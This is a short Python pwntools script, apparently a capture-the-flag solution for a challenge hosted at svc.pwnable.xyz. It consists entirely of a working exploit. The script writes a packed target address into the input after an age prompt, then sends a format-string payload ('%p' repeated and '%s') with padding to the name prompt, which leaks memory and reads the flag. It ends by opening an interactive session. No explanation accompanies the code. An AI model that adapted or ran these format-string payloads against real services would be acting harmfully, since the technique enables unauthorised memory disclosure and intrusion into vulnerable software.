from pwn import *

p = remote("svc.pwnable.xyz", 30004)
flag = 0x601080
payload = b"Y" * 8 + p64(flag)
p.recvuntil("Are you 18 years or older? [y/N]: ")
p.write(payload)

payload = b"A" * 32
format = b"%p " * 8 + b"%s "
payload += format + b"A" * (0x80 - len(format) - 32)
p.recvuntil("Name: ")
p.write(payload)
p.interactive()